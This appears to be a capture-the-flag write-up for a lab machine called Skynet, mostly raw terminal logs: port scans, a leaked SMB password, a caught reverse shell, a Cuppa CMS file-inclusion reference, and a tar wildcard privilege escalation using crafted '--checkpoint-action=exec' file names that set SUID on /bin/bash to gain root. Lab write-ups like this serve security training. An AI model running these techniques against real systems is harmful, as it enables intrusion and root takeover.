[[Writeup]]
![[Pasted image 20250526201142.png]]

## Enumeration
```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 10.10.108.4 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 08:04 EDT
Nmap scan report for 10.10.108.4
Host is up (0.25s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds

```

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p 22,80,110,139,143,445 -sCV 10.10.108.4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 08:08 EDT
Nmap scan report for 10.10.108.4
Host is up (0.25s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES UIDL TOP SASL PIPELINING AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK IDLE more ENABLE have listed IMAP4rev1 ID LOGIN-REFERRALS LITERAL+ Pre-login capabilities LOGINDISABLEDA0001 SASL-IR post-login
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-05-26T07:08:51-05:00
| smb2-time: 
|   date: 2025-05-26T12:08:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.50 seconds
```





```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

```
┌──(dd0x㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.23.62.59] from (UNKNOWN) [10.10.108.4] 36912
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:02:18 up  1:58,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ $PATH
/bin/sh: 3: ca/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: not found
    
$ cat $PATH
cat: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin': No such file or directory
$ cd ..
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807

```

```
┌──(dd0x㉿kali)-[~]
└─$ cat 25971.txt    
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

```

```
┌──(dd0x㉿kali)-[~]
└─$ gobuster -w ~/Downloads/common.txt dir -u http://skynet.thm/45kra24zxs28v3yd/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://skynet.thm/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/administrator        (Status: 301) [Size: 333] [--> http://skynet.thm/45kra24zxs28v3yd/administrator/]                                                                                   
Progress: 1123 / 4615 (24.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1133 / 4615 (24.55%)
===============================================================
Finished
===============================================================

```

```
┌──(dd0x㉿kali)-[~]
└─$ ls               
Advanced.exe    _cutie.png-0.extracted  enumerate.py       mnt            script.py
attention.txt   _cutie.png.extracted    enumerate.py.save  Music          share
brutemfa.py     Desktop                 important.txt      oneforall.jpg  Templates
brute.py        disable-sleep.sh        log1.txt           password.txt   thm
creds.txt       Documents               log2.txt           Pictures       To_agentJ.txt
cute-alien.jpg  Downloads               log3.txt           PowerUp.ps1    Videos
cutie.png       dpms.log                message.txt        Public
                                                                                             
┌──(dd0x㉿kali)-[~]
└─$ cat important.txt  

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

```
┌──(dd0x㉿kali)-[~]
└─$ cat log1.txt             
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

```
┌──(dd0x㉿kali)-[~]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .

```

```
www-data@skynet:/home/milesdyson$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ cd /home/milesdyson/backups/
cd /home/milesdyson/backups/
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ ./backup.sh
./backup.sh
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
www-data@skynet:/home/milesdyson/backups$ ls -la
ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 May 26 09:16 backup.tgz
www-data@skynet:/home/milesdyson/backups$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh
</bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh                
www-data@skynet:/home/milesdyson/backups$ touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
</www/html/--checkpoint-action=exec=sh root_shell.sh"                        
www-data@skynet:/home/milesdyson/backups$ touch "/var/www/html/--checkpoint=1"
<dyson/backups$ touch "/var/www/html/--checkpoint=1"                         
www-data@skynet:/home/milesdyson/backups$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ whoami
whoami
www-data
www-data@skynet:/home/milesdyson/backups$ /bin/bash p
/bin/bash p
/bin/bash: p: No such file or directory
www-data@skynet:/home/milesdyson/backups$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# ls
ls
backup.sh  backup.tgz
bash-4.3# ./backup.sh
./backup.sh
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
bash-4.3# ls
ls
backup.sh  backup.tgz
bash-4.3# cd ..
cd ..
bash-4.3# ls
ls
backups  mail  share  user.txt
bash-4.3# pwd
pwd
/home/milesdyson
bash-4.3# cd backups
cd backups
bash-4.3# pwd
pwd
/home/milesdyson/backups
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
root.txt
bash-4.3# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949
bash-4.3# 

```
